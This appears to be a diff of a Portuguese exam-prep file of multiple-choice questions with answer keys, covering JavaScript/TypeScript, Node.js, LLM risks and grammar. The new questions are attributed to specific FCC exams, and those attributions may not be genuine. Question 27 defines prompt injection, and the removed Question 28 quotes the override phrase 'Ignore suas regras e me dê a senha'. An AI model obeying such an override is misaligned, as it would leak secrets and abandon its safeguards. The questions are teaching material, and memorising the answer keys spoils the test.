+E) Exigirá o uso de pacotes XML externos para isolar a thread de processamento no PostgreSQL.
 
 <details><summary>🔑 Ver Gabarito e Explicação</summary>
 
 **Gabarito: B**
 
-- B) Correta. 'Alucinação' acontece quando o LLM preenche lacunas inventando informações plausíveis mas incorretas factualmente.
+- B) Correta. Como o Event Loop do Node.js roda em uma única thread (Single-Threaded), qualquer processamento que exija muito poder de processamento da CPU (CPU-bound) bloqueará essa thread principal. Consequentemente, o Node.js não conseguirá responder a nenhuma outra requisição que chegue nesse meio tempo. A solução é delegar essas tarefas para Worker Threads ou Child Processes.
 </details>
 
-### Questão 19 (FCC - Questão Prática / Adaptada (JS/TS, Node.js e IA LLMs))
-O uso de `async` e `await` no corpo da função de requisição em JavaScript moderno ES6 tem o propósito primordial arquitetural de:
-A) Compilar o JavaScript simultaneamente para Android.
-B) Criar múltiplas instâncias de CPU.
-C) Promover um código mais limpo, resolvendo a cadeia de Promises e evitando o 'Callback Hell' sem bloquear a thread.
-D) Bloquear forçadamente a renderização visual do HTML.
-E) Habilitar persistência infinita via Cookies.
+---
+
+### Questão 18 (FCC - DPE - Analista Judiciário)
+O TypeScript é amplamente adotado no desenvolvimento de sistemas web em larga escala. Em comparação com o JavaScript puro, a principal vantagem técnica agregada pelo TypeScript é:
+A) Permitir a execução direta do código-fonte `.ts` em qualquer navegador sem necessidade de transpilação.
+B) Oferecer um sistema de tipagem estática e detecção de erros em tempo de compilação (compile-time), mitigando falhas lógicas e inconsistências de tipos de variáveis antes que o código entre em execução (runtime).
+C) Substituir a V8 Engine do Node.js por uma JVM (Java Virtual Machine) dedicada.
+D) Forçar o SGBD PostgreSQL a operar na 3FN sem tabelas associativas.
+E) Eliminar o uso de Promises e restrições de CORS nas chamadas RESTful.
+
+<details><summary>🔑 Ver Gabarito e Explicação</summary>
+
+**Gabarito: B**
+
+- B) Correta. O JavaScript é uma linguagem de tipagem fraca e dinâmica, onde erros de tipo só aparecem em tempo de execução na tela do usuário. O TypeScript funciona como um superconjunto (superset) que adiciona tipagem estática opcional, permitindo que o compilador (`tsc`) identifique inconsistências e erros estruturais antes de rodar o código, gerando mais estabilidade e autocomplementação na IDE.
+</details>
+
+---
+
+### Questão 19 (FCC - TRT - Analista de TI)
+No JavaScript ES6 moderno, as palavras-chave async e await são usadas em conjunto no escopo de funções assíncronas. O objetivo primordial da adoção do padrão async/await em substituição à cadeia clássica de tratamentos de Promises (`.then().catch()`) é:
+A) Compilar o JavaScript para binários nativos executáveis no SO host.
+B) Possibilitar a escrita de código assíncrono com sintaxe limpa e legível que se assemelha ao fluxo síncrono estruturado, reduzindo anomalias de Callback Hell.
+C) Criar threads físicas de concorrência paralela bare-metal na CPU.
+D) Forçar o garbage collector do navegador a limpar dados de cookies instantaneamente.
+E) Impedir a injeção de parâmetros maliciosos SQL via requisições POST.
+
+<details><summary>🔑 Ver Gabarito e Explicação</summary>
+
+**Gabarito: B**
+
+- B) Correta. O padrão `async/await` atua como açúcar sintático (syntactic sugar) sobre as Promises. Ele permite escrever rotinas de espera assíncronas de forma linear e limpa (usando try/catch clássicos para erros), evitando o aninhamento excessivo de funções de retorno (Callback Hell) que prejudica a legibilidade e manutenção do software.
+</details>
+
+---
+
+### Questão 20 (FCC - TJ - Programador)
+Durante a homologação, um programador adicionou a tag `<script src="valida.ts"></script>` em uma página HTML estática e submeteu ao servidor. O navegador, contudo, exibiu um erro de sintaxe e não executou as validações descritas no script. O incidente ocorreu porque:
+A) O servidor Apache Web Server impede o uso de tags de script em sub-redes privadas.
+B) O navegador compreende exclusivamente código JavaScript nativo; o código TypeScript deve passar obrigatoriamente por um processo de transpilação (compilação) usando o compilador `tsc` para gerar o arquivo `.js` correspondente antes de ser inserido na página HTML.
+C) O script foi executado em modo strict, o que proíbe variáveis do tipo const no escopo global.
+D) A página HTML deveria ter sido configurada para rodar em formato JSON.
+E) Falhou a resolução DNS do arquivo local.
+
+<details><summary>🔑 Ver Gabarito e Explicação</summary>
+
+**Gabarito: B**
+
+- B) Correta. Os browsers só compreendem JavaScript (e WebAssembly). O TypeScript é uma linguagem para a fase de desenvolvimento. Antes de distribuir a aplicação (seja para o frontend ou backend), é obrigatório transpilar/compilar os arquivos `.ts` para código JavaScript compatível (`.js`).
+</details>
+
+---
+
+### Questão 21 (FCC - TRE - Analista de Segurança)
+Ao treinar desenvolvedores para o uso responsável de assistentes de Inteligência Artificial baseados em Grandes Modelos de Linguagem (LLMs), a coordenação de TI alertou sobre riscos de confidencialidade dos dados. O risco principal de segurança ao se colar códigos-fonte proprietários ou dados reais de cidadãos nas caixas de chat de assistentes de IA públicos na web é:
+A) Provocar ataques volumétricos SYN Flood nas instâncias de virtualização locais.
+B) O vazamento de dados confidenciais (Data Leakage), uma vez que os trechos e dados enviados são armazenados e comumente integrados nos conjuntos de treinamento de futuros modelos da empresa provedora de IA.
+C) A alteração arbitrária de chaves primárias compostas no PostgreSQL do órgão.
+D) A incompatibilidade imediata do interpretador JavaScript com as rotas RESTful.
+E) O bloqueio temporário das portas físicas do roteador de borda do tribunal.
+
+<details><summary>🔑 Ver Gabarito e Explicação</summary>
+
+**Gabarito: B**
+
+- B) Correta. Colar dados reais ou códigos com segredos/propriedade intelectual em IAs públicas envia esses dados para servidores externos. Esses prompts podem ser processados por humanos e usados para treinar novas versões dos modelos. Isso pode expor segredos industriais ou violar leis de privacidade de dados (como a LGPD) caso ocorra vazamento involuntário dos dados na inferência de outros usuários.
+</details>
+
+---
+
+### Questão 22 (FCC - TRF - Tecnologia da Informação)
+No desenvolvimento de integrações backend com Express.js no ecossistema Node.js, a arquitetura de Middlewares desempenha um papel central. Um middleware é definido essencialmente como:
+A) Uma tabela associativa do PostgreSQL dedicada a auditoria.
+B) Um compilador que converte JSON para XML de forma síncrona.
+C) Uma função intermediária que possui acesso aos objetos de requisição (Request), resposta (Response) e à próxima função middleware no ciclo de solicitação-resposta da aplicação, comumente usada para autenticar tokens JWT ou logar requisições.
+D) Um serviço de load balancer físico executado na camada de transporte.
+E) Um script de banco de dados rodado apenas em caso de commits em lote.
 
 <details><summary>🔑 Ver Gabarito e Explicação</summary>
 
 **Gabarito: C**
 
-- C) Correta. A dupla `async/await` permite escrever rotinas assíncronas como se fossem síncronas, melhorando radicalmente a legibilidade.
+- C) Correta. No Express, Middlewares são funções executadas sequencialmente no fluxo de processamento de uma requisição HTTP. Eles podem inspecionar o request, modificar o body, validar credenciais (como validar o token de login no cabeçalho), abortar a requisição com códigos de erro ou repassar o controle para o próximo middleware (`next()`).
 </details>
 
-### Questão 20 (FCC - Questão Prática / Adaptada (JS/TS, Node.js e IA LLMs))
-Ao injetar o arquivo nativo `.ts` no servidor Apache como `<script src='auditoria.ts'></script>`, o sistema web travou alegando erro de sintaxe. A falha ocorreu porque:
-A) Tipagem Dinâmica não tolerante.
-B) Falta de injeção Spring Boot.
-C) Os navegadores compreendem exclusivamente JavaScript. O TypeScript precisa passar por 'Transpilação' usando o compilador para gerar o arquivo `.js` final.
-D) Falta da diretiva `strict-mode`.
-E) Falta de um DNS reverso.
+---
+
+### Questão 23 (FCC - TJ - Analista Judiciário)
+O framework Express.js roda sobre o ecossistema Node.js. Para efetuar leitura e escrita de arquivos de logs ou documentos PDF salvos em diretórios físicos do servidor local de forma assíncrona, a API Express consome o módulo nativo (Built-in) do Node.js denominado:
+A) Path.
+B) OS (Operating System).
+C) FS (File System).
+D) HTTP.
+E) Mongoose.
 
 <details><summary>🔑 Ver Gabarito e Explicação</summary>
 
 **Gabarito: C**
 
-- C) Correta. Navegadores não entendem TS nativamente. É obrigatória a transpilação para o JS padrão da web.
+- C) Correta. O módulo `fs` (File System) do Node.js provê APIs síncronas e assíncronas para manipulação de arquivos (criar, ler, alterar, deletar arquivos e pastas). Ele interage com o sistema operacional por meio das APIs do kernel.
 </details>
 
-### Questão 21 (FCC - Questão Prática / Adaptada (JS/TS, Node.js e IA LLMs))
-Jogar trechos complexos de código processual sensível na caixa do ChatGPT comercial aberto apresenta o risco intrínseco de:
-A) Vazamento de Dados Sensíveis (Data Privacy), uma vez que o código pode ser utilizado no treinamento e inferência dos provedores.
-B) Aumento da latência no Linux local.
-C) Danos puramente estéticos no PEP8.
-D) DoS volumétrico mitigando portas altas.
-E) Invasão física nas fitas do datacenter.
+---
+
+### Questão 24 (FCC - TRE - Analista de Sistemas)
+No padrão ES6+ do JavaScript, a declaração de variáveis pode ser realizada utilizando let e const em substituição ao antigo var. Sobre as propriedades do const, é correto afirmar:
+A) Impede qualquer modificação nos atributos internos de um objeto declarado, forçando a imutabilidade recursiva e profunda de todo o objeto.
+B) Permite a reatribuição de novos valores primitivos ou ponteiros de objetos na mesma variável dentro de seu escopo de execução.
+C) Garante a imutabilidade da referência (do ponteiro) da variável, impedindo que ela seja reatribuída com outro valor ou objeto, embora as propriedades internas de um objeto ou array referenciado por const ainda possam ser modificadas.
+D) Cria variáveis de escopo global que são visíveis fora da sandbox de containers.
+E) Exige que seu valor seja do tipo numérico inteiro ou float obrigatoriamente.
+
+<details><summary>🔑 Ver Gabarito e Explicação</summary>
+
+**Gabarito: C**
+
+- C) Correta. A declaração `const` cria uma variável cuja referência não pode mudar (reatribuição é proibida: `const x = 5; x = 6` causa erro). Porém, `const` não garante imutabilidade profunda. Se `const obj = { nome: "João" };`, o programador pode perfeitamente fazer `obj.nome = "Maria"` (mutabilidade do objeto), pois a referência em memória apontada pela variável `obj` não mudou.
+</details>
+
+---
+
+### Questão 25 (FCC - TRT - Programador de Sistemas)
+Frameworks modernos de SPA (Single Page Application) mitigam vulnerabilidades clássicas de Cross-Site Scripting (XSS) client-side durante a renderização de strings inseridas por usuários em campos de formulários. Esse comportamento protetivo padrão de frameworks como React e Angular baseia-se na:
+A) Execução de túneis VPN automáticos no navegador do usuário.
+B) Codificação em Base64 de todo o código HTML do portal.
+C) Sanitização e escape automático de strings (Auto-Escaping) que converte caracteres especiais como `<` e `>` em entidades HTML seguras (`&lt;` e `&gt;`), renderizando scripts nocivos como texto comum sem capacidade de execução.
+D) Utilização do protocolo SSH para trafegar os dados do DOM.
+E) Restrição do escopo de execução do Javascript ao banco de dados relacional.
+
+<details><summary>🔑 Ver Gabarito e Explicação</summary>
+
+**Gabarito: C**
+
+- C) Correta. Motores de renderização modernos tratam por padrão dados dinâmicos como texto comum e não como código executável. Ao interpolar dados (`{user_input}` no React), os caracteres estruturais do HTML são escapados de forma automatizada, neutralizando scripts maliciosos injetados. Para injetar HTML de forma bruta, deve-se usar propriedades específicas e de risco como `dangerouslySetInnerHTML`.
+</details>
+
+---
+
+### Questão 26 (FCC - DPE - Tecnologia da Informação)
+No contexto de concorrência e escalabilidade de processos em servidores backend Node.js, qual recurso nativo do ecossistema permite executar tarefas de computação intensa de CPU de forma paralela real, distribuindo o processamento por cores secundários da CPU, sem bloquear o Event Loop principal?
+A) Event Loop Promisified Core.
+B) Worker Threads (módulo `worker_threads`).
+C) NPM Cluster Registry.
+D) Express Sub-routing.
+E) Mapeamento de chaves estrangeiras compostas.
+
+<details><summary>🔑 Ver Gabarito e Explicação</summary>
+
+**Gabarito: B**
+
+- B) Correta. Para contornar a limitação de thread única em processamentos pesados de CPU, o Node.js introduziu o módulo `worker_threads`. Ele permite executar código JavaScript de forma paralela em threads separadas que compartilham memória de forma eficiente, sem travar o Event Loop da thread principal que escuta as conexões web.
+</details>
+
+---
+
+### Questão 27 (FCC - TJ - Analista de Redes)
+Ameaças direcionadas a sistemas de inteligência artificial vêm crescendo. O ataque que consiste em enviar instruções maliciosas elaboradas em formato de prompt de texto conversacional para ludibriar um assistente de IA, forçando-o a ignorar suas regras de segurança originais e revelar informações sensíveis, é denominado:
+A) SQL Injection client-side.
+B) Prompt Injection (ou Jailbreaking).
+C) Pharming base Trojan.
+D) Blind XSS lateral.
+E) SYN Flood semântico.
+
+<details><summary>🔑 Ver Gabarito e Explicação</summary>
+
+**Gabarito: B**
+
+- B) Correta. O *Prompt Injection* ocorre quando um invasor insere comandos ocultos ou enganosos nas mensagens enviadas ao LLM. Isso faz com que a IA seja "sequestrada" e passe a responder de acordo com a vontade do atacante (evadindo restrições de moderação ou revelando dados confidenciais contidos no prompt do sistema).
+</details>
+
+---
+
+### Questão 28 (FCC - TRF - Tecnologia da Informação)
+Na integração de APIs RESTful baseadas no formato JSON no ecossistema JavaScript, a serialização e desserialização são necessárias. O programador deve usar, respectivamente, os seguintes métodos estáticos da classe mestre global `JSON`:
+A) `JSON.parse()` para desserialização (converter string JSON em objeto JS) e `JSON.stringify()` para serialização (converter objeto JS em string JSON).
+B) `JSON.stringify()` para desserialização e `JSON.parse()` para serialização.
+C) `JSON.encode()` e `JSON.decode()`.
+D) `JSON.toBSON()` e `JSON.fromBSON()`.
+E) `JSON.serialize()` e `JSON.deserialize()`.
 
 <details><summary>🔑 Ver Gabarito e Explicação</summary>
 
 **Gabarito: A**
 
-- A) Correta. Dados enviados para IAs públicas podem ser retidos para treinar modelos, configurando violação grave de confidencialidade governamental.
+- A) Correta. A serialização é o ato de converter um objeto em memória em uma string para envio na rede: usa-se `JSON.stringify(objeto)`. A desserialização converte a string recebida de volta para objeto em memória JS para uso no código: usa-se `JSON.parse(string)`.
 </details>
 
-### Questão 22 (FCC - Questão Prática / Adaptada (JS/TS, Node.js e IA LLMs))
-O core primário do Node.js que orquestra eficientemente a execução interligada e a distribuição assíncrona, garantindo o 'Non-Blocking I/O', é conhecido como:
-A) Garbage Collector Heap Builder.
-B) Event Loop (libuv).
-C) NPM Registry.
-D) Express.js Pipeline Router.
-E) Apache Multiprocessing Worker.
+---
 
-<details><summary>🔑 Ver Gabarito e Explicação</summary>
-
-**Gabarito: B**
-
-- B) Correta. O Event Loop no Node (provido pela libuv) delega operações de I/O de forma assíncrona, permitindo milhares de conexões em thread única.
-</details>
-
-### Questão 23 (FCC - Questão Prática / Adaptada (JS/TS, Node.js e IA LLMs))
-A arquitetura responsável por interceptar chamadas HTTP no Express (como processar tokens JWT antes do código rodar o banco), intercalada no trajeto, define a camada de:
-A) Stored Procedures.
-B) Middlewares.
-C) Servlets Java.
-D) Transpiladores.
-E) Web Workers.
-
-<details><summary>🔑 Ver Gabarito e Explicação</summary>
-
-**Gabarito: B**
-
-- B) Correta. Middlewares no Express são funções sequenciais executadas no meio do caminho da requisição HTTP para tratativas.
-</details>
-
-### Questão 24 (FCC - Questão Prática / Adaptada (JS/TS, Node.js e IA LLMs))
-O módulo padrão 'Built-in' incorporado do Node utilizado para manipular assincronamente a Leitura e Escrita local de diretórios e arquivos PDF no disco rígido é o:
-A) path e mongoose.
-B) fs (File System).
-C) os (Operating System).
-D) crypto.
-E) webpack.
-
-<details><summary>🔑 Ver Gabarito e Explicação</summary>
-
-**Gabarito: B**
-
-- B) Correta. A biblioteca `fs` lida com as interações de arquivo no sistema operacional hospedeiro.
-</details>
-
-### Questão 25 (FCC - Questão Prática / Adaptada (JS/TS, Node.js e IA LLMs))
-Para garantir imutabilidade de referência no Javascript ES6+, a declaração de uma variável é prefixada com a palavra-chave reservada:
-A) var.
-B) let.
-C) const.
-D) final.
-E) immutable.
-
-<details><summary>🔑 Ver Gabarito e Explicação</summary>
-
-**Gabarito: C**
-
-- C) Correta. `const` cria uma constante lógica cuja referência/ponteiro não pode sofrer reatribuição durante a execução do escopo.
-</details>
-
-### Questão 26 (FCC - Questão Prática / Adaptada (JS/TS, Node.js e IA LLMs))
-Frameworks como React mitigam injeções XSS client-side ao renderizar valores formatados de input nativamente usando:
-A) Execução direta na tag hidden.
-B) O escape autossanitizador (Auto-Escaping) renderizando scripts como texto visual inofensivo sem compilação.
-C) Criptografia RSA 4096 local.
-D) Substituição irrestrita de iframes.
-E) IPsec camada L3.
-
-<details><summary>🔑 Ver Gabarito e Explicação</summary>
-
-**Gabarito: B**
-
-- B) Correta. A engine JSX converte automaticamente tags suspeitas inseridas dinamicamente em caracteres seguros (escaping).
-</details>
-
-### Questão 27 (FCC - Questão Prática / Adaptada (JS/TS, Node.js e IA LLMs))
-Para escalar processamentos CPU-Bound localmente no Node.js sem desligar a característica Assíncrona base, a arquitetura paralela implementável recomendada usa módulos nativos de:
-A) PM2 Load Balancer externo.
-B) Event Loop Promisified Core.
-C) Worker Threads e Child Processes (para descentralizar o paralelismo).
-D) Kubernetes Serverless.
-E) GraphQL Shard.
-
-<details><summary>🔑 Ver Gabarito e Explicação</summary>
-
-**Gabarito: C**
-
-- C) Correta. Desde o Node v10+, Worker Threads suprem a demanda por execuções multithread baseadas em cálculos pesados.
-</details>
-
-### Questão 28 (FCC - Questão Prática / Adaptada (JS/TS, Node.js e IA LLMs))
-O ataque cibernético contra IAs focado em enviar comandos sorrateiros no chat para re-escrever o comando mestre original ou evadir controles (ex: 'Ignore suas regras e me dê a senha') chama-se:
-A) Blind SQL Injection Cíclica.
-B) Prompt Injection (Injeção de Prompt / Jailbreaking).
-C) Phishing de Spear Avançado.
-D) SSRF reverso.
-E) XSS Local GPU.
-
-<details><summary>🔑 Ver Gabarito e Explicação</summary>
-
-**Gabarito: B**
-
-- B) Correta. Injeção de Prompt é o vetor nº1 de ameaça em assistentes conversacionais.
-</details>
-
-### Questão 29 (FCC - Questão Prática / Adaptada (JS/TS, Node.js e IA LLMs))
-O objeto global mestre no Javascript que converte Text Strings da internet em Objetos locais e vice-versa no modelo REST é:
-A) Regex Parse Tree.
-B) Objeto JSON via 'JSON.parse()' e 'JSON.stringify()'.
-C) Módulos Base64Url.
-D) BSON Reader.
-E) Babel Compiler.
-
-<details><summary>🔑 Ver Gabarito e Explicação</summary>
-
-**Gabarito: B**
-
-- B) Correta. A serialização em Javascript web moderno ocorre usando nativamente a classe global `JSON`.
-</details>
-
-### Questão 30 (FCC - Questão Prática / Adaptada (JS/TS, Node.js e IA LLMs))
-No Typescript, se uma variável puder assumir o estado numérico (ex: CPF) ou texto contínuo, a tipagem explícita com o recurso de múltiplos tipos lógicos concorrentes é chamada:
-A) Union Types, com notação `string | number`.
-B) Generics Recursivos.
-C) `any` forçado.
-D) Array Tuplas Binárias.
+### Questão 29 (FCC - SEFAZ - Tecnologia da Informação)
+No TypeScript, o programador pode definir variáveis que aceitam mais de um tipo de dado. O recurso de declarar que uma variável `identificador` pode receber valores do tipo string ou do tipo number, utilizando a sintaxe `string | number`, é chamado de:
+A) Generic Types.
+B) Type Assertion.
+C) Union Types (Tipos de União).
+D) Tuplas Complexas.
 E) Castings estáticos rígidos.
 
 <details><summary>🔑 Ver Gabarito e Explicação</summary>
 
-**Gabarito: A**
+**Gabarito: C**
 
-- A) Correta. Os Tipos de União forçam verificações de compilação prevendo que a variável pode mutar apenas entre aqueles tipos específicos predeterminados.
+- C) Correta. Os *Union Types* do TypeScript permitem combinar tipos primitivos ou personalizados de forma paralela. A notação `string | number` diz ao compilador que a variável pode aceitar um ou outro tipo legitimamente, disparando verificações estáticas de tipo (type narrowing) antes do uso das propriedades.
 </details>
+
+---
+
+### Questão 30 (FCC - TRE - Analista Judiciário)
+O interpretador JavaScript gerencia a ordem de execução do código assíncrono. O componente que armazena na memória as mensagens e as funções callback vindas de requisições de rede finalizadas, aguardando que a pilha de execução (Call Stack) fique completamente vazia para poder executá-las, é a:
+A) Call Stack principal.
+B) Callback Queue (ou Event Queue).
+C) Garbage Collection Pool.
+D) Heap de Alocação de Objetos.
+E) Thread de Rede Física.
+
+<details><summary>🔑 Ver Gabarito e Explicação</summary>
+
+**Gabarito: B**
+
+- B) Correta. O fluxo assíncrono do JS funciona de modo que, quando a tarefa externa termina (ex: requisição web retorna), seu callback vai para a *Callback Queue*. O Event Loop monitora se a *Call Stack* está vazia; quando está, ele puxa o primeiro item da Callback Queue e o coloca na Call Stack para execução real.
+</details>
+
+---
 
 ## 📝 TEMA 3: Língua Portuguesa (Pontuação, Discursos e Significação das Palavras)
 
-### Questão 31 (FCC - Questão Prática / Adaptada (Gramática e Discursos))
-Considere: *"O magistrado titular da vara que sempre foi muito rigoroso com os prazos decidiu suspender a audiência..."* Considerando as regras de pontuação, assinale a alternativa cuja pontuação está **correta** e transforma a oração adjetiva em uma explicação isolada e acessória:
-A) O magistrado titular da vara, que sempre foi muito rigoroso com os prazos decidiu suspender a audiência...
-B) O magistrado titular da vara, que sempre foi muito rigoroso com os prazos, decidiu suspender a audiência...
-C) O magistrado, titular da vara que sempre foi muito rigoroso com os prazos decidiu suspender a audiência...
-D) O magistrado titular da vara que sempre foi muito rigoroso com os prazos, decidiu suspender a audiência...
-E) O magistrado titular, da vara que sempre foi muito rigoroso, com os prazos decidiu suspender a audiência...
-
-<details><summary>🔑 Ver Gabarito e Explicação</summary>
-
-**Gabarito: B**
-
-- B) Correta. As vírgulas transformam a adjetiva restritiva em explicativa, e não violam a separação do verbo principal.
-</details>
-
-### Questão 32 (FCC - Questão Prática / Adaptada (Gramática e Discursos))
-Na frase: *"O oficial de justiça não obstante a resistência do réu cumpriu a ordem de despejo..."* Assinale a alternativa com a pontuação adequada:
-A) O oficial de justiça não obstante, a resistência do réu, cumpriu a ordem...
-B) O oficial de justiça não obstante a resistência, do réu cumpriu a ordem...
-C) O oficial de justiça, não obstante a resistência do réu, cumpriu a ordem...
-D) O oficial de justiça não obstante a resistência do réu cumpriu a ordem, de despejo...
-E) O oficial, de justiça não obstante a resistência do réu cumpriu, a ordem...
-
-<details><summary>🔑 Ver Gabarito e Explicação</summary>
-
-**Gabarito: C**
-
-- C) Correta. A expressão 'não obstante a resistência do réu' tem função adverbial deslocada extensa e deve ser isolada por vírgulas completas.
-</details>
-
-### Questão 33 (FCC - Questão Prática / Adaptada (Gramática e Discursos))
-No período: *"As falhas não resultaram apenas em prejuízos financeiros: demonstraram também a vulnerabilidade..."* O uso dos dois-pontos serve para:
-A) Encerrar uma enumeração.
-B) Introduzir citação direta.
-C) Apresentar um esclarecimento, consequência ou desdobramento lógico em relação à oração anterior.
-D) Substituir a vírgula para separar coordenadas aditivas unidas por 'apenas'.
-E) Marcar fala indireta.
-
-<details><summary>🔑 Ver Gabarito e Explicação</summary>
-
-**Gabarito: C**
-
-- C) Correta. Os dois pontos aqui anunciam a explicação argumentativa complementar à afirmação.
-</details>
-
-### Questão 34 (FCC - Questão Prática / Adaptada (Gramática e Discursos))
-No trecho: *"Como resolver esse banco de dados que não para de cair?, pensou ele sentindo um aperto..."* Ocorre a fusão do pensamento com a narração direta. Esta técnica é:
-A) Discurso Indireto Clássico.
-B) Discurso Direto oculto.
-C) Monólogo em Segunda Pessoa.
-D) Discurso Indireto Livre.
-E) Narração Extradiegética.
+### Questão 31 (FCC - TRT - Analista Judiciário)
+Assinale a alternativa que apresenta pontuação em total conformidade com a norma-padrão da língua portuguesa:
+A) Os técnicos de infraestrutura da TI do Tribunal, restauraram os servidores antes do expediente de ontem.
+B) Os técnicos de infraestrutura da TI do Tribunal restauraram, os servidores antes do expediente de ontem.
+C) Os técnicos de infraestrutura da TI do Tribunal restauraram os servidores antes, do expediente de ontem.
+D) Os técnicos de infraestrutura da TI do Tribunal restauraram os servidores antes do expediente de ontem.
+E) Os técnicos, de infraestrutura da TI do Tribunal, restauraram os servidores antes do expediente de ontem.
 
 <details><summary>🔑 Ver Gabarito e Explicação</summary>
 
 **Gabarito: D**
 
-- D) Correta. Ocorre a intromissão do pensamento direto no fluxo narrativo do autor (Discurso Indireto Livre).
+- D) Correta. A oração está na ordem direta: Sujeito ("Os técnicos de infraestrutura da TI do Tribunal") + Verbo ("restauraram") + Objeto ("os servidores") + Adjunto Adverbial de tempo ("antes do expediente de ontem"). A regra básica proíbe separar o sujeito do verbo por vírgula (como em A) ou o verbo de seu objeto (como em B), dispensando pontuação nessa estrutura direta.
 </details>
 
-### Questão 35 (FCC - Questão Prática / Adaptada (Gramática e Discursos))
-A frase *'A testemunha declarou: "Eu não entreguei os pen-drives ontem"'* convertida para **Discurso Indireto** culta é:
-A) ... declarou que não entreguei os pen-drives ontem.
-B) ... declarou se ela não entregava os pen-drives ontem.
-C) ... declarou que não entregara os pen-drives no dia anterior.
-D) ... declarara de que não vai entregar os pen-drives no dia passado.
-E) ... declarou que não tinha entregado os pen-drives amanhã.
+---
 
-<details><summary>🔑 Ver Gabarito e Explicação</summary>
-
-**Gabarito: C**
-
-- C) Correta. O pronome 1ª vira 3ª, Pretérito Perfeito vira Mais-que-perfeito, e 'ontem' vira 'no dia anterior'.
-</details>
-
-### Questão 36 (FCC - Questão Prática / Adaptada (Gramática e Discursos))
-Substitua mantendo o sentido de rigor: *"comportamento **inexorável** e atitude **intransigente** ... habilidade **indubitável**"*.
-A) flexível - compreensiva - duvidosa.
-B) brando - inconstante - inquestionável.
-C) implacável - inflexível - incontestável.
-D) severo - negligente - questionável.
-E) vacilante - autoritária - discutível.
-
-<details><summary>🔑 Ver Gabarito e Explicação</summary>
-
-**Gabarito: C**
-
-- C) Correta. Inexorável = implacável. Intransigente = inflexível. Indubitável = sem dúvida (incontestável).
-</details>
-
-### Questão 37 (FCC - Questão Prática / Adaptada (Gramática e Discursos))
-O analista alegou que o erro não foi dolo, mas **incúria** e **açodamento**. Substitua por sinônimos:
-A) prudência - cautela.
-B) malícia - agressividade.
-C) lentidão - hesitação.
-D) negligência - precipitação.
-E) competência - agilidade.
-
-<details><summary>🔑 Ver Gabarito e Explicação</summary>
-
-**Gabarito: D**
-
-- D) Correta. Incúria significa falta de cuidado (negligência). Açodamento é pressa extrema (precipitação).
-</details>
-
-### Questão 38 (FCC - Questão Prática / Adaptada (Gramática e Discursos))
-Qual alternativa apresenta antônimos diretos e perfeitos?
-A) Pusilânime x Covarde.
-B) Efêmero x Fugaz.
-C) Prolixo x Lacônico.
-D) Inócuo x Inofensivo.
-E) Loquaz x Comunicativo.
-
-<details><summary>🔑 Ver Gabarito e Explicação</summary>
-
-**Gabarito: C**
-
-- C) Correta. Prolixo (longo/cheio de palavras) x Lacônico (curto, direto). O resto são sinônimos.
-</details>
-
-### Questão 39 (FCC - Questão Prática / Adaptada (Gramática e Discursos))
-Na frase *"Os servidores de TI, sempre sobrecarregados na véspera do fechamento, conseguiram restaurar o link"*. As vírgulas ocorrem porque:
-A) Separam sujeitos compostos.
-B) Isolam um aposto explicativo extenso deslocado.
-C) Isolam uma expressão adverbial de tempo.
-D) Isolam orações coordenadas.
-E) Isolam adjunto adnominal restritivo.
-
-<details><summary>🔑 Ver Gabarito e Explicação</summary>
-
-**Gabarito: B**
-
-- B) Correta. Trata-se de uma explicação extra isolada sobre os servidores da TI.
-</details>
-
-### Questão 40 (FCC - Questão Prática / Adaptada (Gramática e Discursos))
-Por que a pontuação está incorreta em: *"O presidente do tribunal, deferiu o pedido emergencial ontem visto que, a situação era crítica."*?
-A) 'emergencial' dispensa vírgula.
-B) A primeira vírgula separa indevidamente sujeito e verbo, e a segunda separa a conjunção explicativa da sua própria oração subordinada.
-C) O 'que' exige dois-pontos.
-D) Isolam aposto temporal incompleto.
-E) Faltou ponto-e-vírgula antes do verbo.
-
-<details><summary>🔑 Ver Gabarito e Explicação</summary>
-
-**Gabarito: B**
-
-- B) Correta. Viola a regra primária de proibição do isolamento sujeito-verbo.
-</details>
-
-### Questão 41 (FCC - Questão Prática / Adaptada (Gramática e Discursos))
-Qual alternativa representa o uso perfeito do Ponto-e-Vírgula (;)?
-A) O réu foi condenado; e lavagem de dinheiro.
-B) A testemunha não respondeu; do promotor.
-C) O sistema foi desenhado para ser seguro; contudo, a falta de verbas impediu a implantação.
-D) Segundo as novas regras; todos os processos...
-E) Apenas os estagiários, terceirizados; compareceram.
-
-<details><summary>🔑 Ver Gabarito e Explicação</summary>
-
-**Gabarito: C**
-
-- C) Correta. O ponto-e-vírgula é ideal para separar orações coordenadas extensas opostas iniciadas por 'contudo'.
-</details>
-
-### Questão 42 (FCC - Questão Prática / Adaptada (Gramática e Discursos))
-Identifique a falha em: *"Todos os servidores concursados, comissionados e estagiários, deverão bater o ponto virtual às 08:00, contudo os terceirizados às 09:00."*
-A) A vírgula após 'estagiários' separa o sujeito do verbo, e falta vírgula antes de 'contudo'.
-B) A vírgula após 'concursados' não deveria existir.
-C) Falta dois-pontos e ponto final no 'h'.
-D) 'Todos' deveria usar travessão.
-E) Texto está perfeito.
+### Questão 32 (FCC - TJ - Analista de TI)
+Considere o período: *"O analista de segurança que se formou no exterior auditou todos os servidores de bancos de dados."* Inserindo-se vírgulas para isolar a oração adjetiva *"que se formou no exterior"*, obtém-se o seguinte resultado semântico:
+A) A oração adjetiva passa de restritiva a explicativa, passando a se referir à totalidade dos analistas de segurança (generalizando que todos se formaram no exterior).
+B) O sentido original de restrição é acentuado, especificando que apenas aquele analista que se formou no exterior realizou a auditoria.
+C) O período torna-se gramaticalmente incorreto por separar o sujeito do verbo.
+D) A oração adjetiva converte-se em oração coordenada sindética adversativa.
+E) A alteração de pontuação não causa alteração sintática ou semântica no período.
 
 <details><summary>🔑 Ver Gabarito e Explicação</summary>
 
 **Gabarito: A**
 
-- A) Correta. É probido colocar vírgula cortando a trindade Sujeito-Verbo-Complemento. Além disso, orações coordenadas exigem marcação antes da conjunção adversativa.
+- A) Correta. A oração adjetiva sem vírgula é restritiva (restringe a um analista específico). A inclusão de vírgulas transformará a oração em explicativa, mudando o sentido: ela passa a ser um comentário acessório explicativo geral sobre o termo antecedente (generalizando que o analista de segurança se formou no exterior).
 </details>
 
-### Questão 43 (FCC - Questão Prática / Adaptada (Gramática e Discursos))
-Na frase: *"O comportamento **belicoso** causou espanto, visto que todos possuíam um trato **cordato**."* Os significados são:
-A) inteligente e pacato.
-B) dissimulado e ardiloso.
-C) guerreiro/agressivo e pacífico/conciliador.
-D) covarde e corajoso.
-E) calado e loquaz.
+---
+
+### Questão 33 (FCC - TRE - Analista Judiciário)
